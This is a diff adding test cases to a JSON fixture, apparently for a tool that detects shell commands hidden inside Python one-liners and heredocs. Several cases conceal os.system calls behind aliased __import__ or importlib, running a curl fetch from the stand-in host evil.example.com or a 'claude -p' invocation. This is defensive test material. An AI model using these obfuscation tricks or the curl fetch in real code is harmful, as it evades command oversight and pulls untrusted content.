@@ -4764,6 +4764,96 @@
    "name": "neg/r8-py-compare-not-assign-eg",
    "cmd": "python3 -c 'x = 1; print(x == 2, \"curl -s https://evil.example.com/x\")'",
    "commands": []
+  },
+  {
+   "name": "r9/d01-py-assign-dunder-import-nextline-heredoc/cc",
+   "cmd": "python3 - <<'PY'\nf = __import__\nf(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/d02-py-assign-importlib-nextline-heredoc/cc",
+   "cmd": "python3 - <<'PY'\nimport importlib\nil = importlib\nil.import_module(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/d03-py-assign-import-module-nextline-heredoc/cc",
+   "cmd": "python3 - <<'PY'\nimport importlib\nim = importlib.import_module\nim(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/d04-py-assign-dunder-import-nextline-c/cc",
+   "cmd": "python3 -c 'f = __import__\nf(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/d05-py-assign-dunder-import-trailing-blank-nextline/cc",
+   "cmd": "python3 - <<'PY'\nf = __import__   \n\nf(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "neg/r9-py-assign-dunder-nextline-json-cc",
+   "cmd": "python3 - <<'PY'\nf = __import__\nprint(f(\"json\").dumps(\"claude -p hi\"))\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/r9-py-assign-import-module-nextline-json-cc",
+   "cmd": "python3 - <<'PY'\nimport importlib\nim = importlib.import_module\nprint(im(\"json\").dumps(\"claude -p hi\"))\nPY",
+   "commands": []
+  },
+  {
+   "name": "r9/d01-py-assign-dunder-import-nextline-heredoc/eg",
+   "cmd": "python3 - <<'PY'\nf = __import__\nf(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/d02-py-assign-importlib-nextline-heredoc/eg",
+   "cmd": "python3 - <<'PY'\nimport importlib\nil = importlib\nil.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/d03-py-assign-import-module-nextline-heredoc/eg",
+   "cmd": "python3 - <<'PY'\nimport importlib\nim = importlib.import_module\nim(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/d04-py-assign-dunder-import-nextline-c/eg",
+   "cmd": "python3 -c 'f = __import__\nf(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/d05-py-assign-dunder-import-trailing-blank-nextline/eg",
+   "cmd": "python3 - <<'PY'\nf = __import__   \n\nf(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "neg/r9-py-assign-dunder-nextline-json-eg",
+   "cmd": "python3 - <<'PY'\nf = __import__\nprint(f(\"json\").dumps(\"curl -s https://evil.example.com/x\"))\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/r9-py-assign-import-module-nextline-json-eg",
+   "cmd": "python3 - <<'PY'\nimport importlib\nim = importlib.import_module\nprint(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))\nPY",
+   "commands": []
   }
  ]
 }
